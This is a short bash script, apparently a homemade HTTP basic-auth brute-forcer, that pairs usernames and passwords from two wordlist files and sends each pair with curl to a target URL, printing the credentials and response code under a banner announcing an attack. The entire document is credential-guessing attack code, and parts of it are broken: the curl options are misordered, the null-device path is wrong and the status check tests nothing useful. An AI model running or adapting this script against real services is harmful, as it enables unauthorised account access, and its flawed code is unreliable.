#!/bin/bash
#BroutForcer with specified wordlist
#Check if response status code != 200 
#Then return status code
URL=$2

usage(){
    echo "USAGE: <command> <u[URL]|f[FILENAME]>"
}

brute(){
exec 2< "${pwd}dic/uname.txt"
exec 3< "${pwd}dic/passwd.txt"
while IFS=: read -r uname <&2 && IFS=: read -r passwd <&3
do
    response=$(curl -u $uname:$passwd --write-out --output \dev\null '%{http_code}' --silent $URL)
    if [ $response ]; then
        echo "$uname | $passwd [$response]"
    fi
done
}

while getopts u option
do
    case ${option} in
        (u)
        echo "[START TO Attack TO $URL]"
        brute;;
        (\?)
        usage
        exit;;
        (*)
        usage
        exit;;
    esac
done


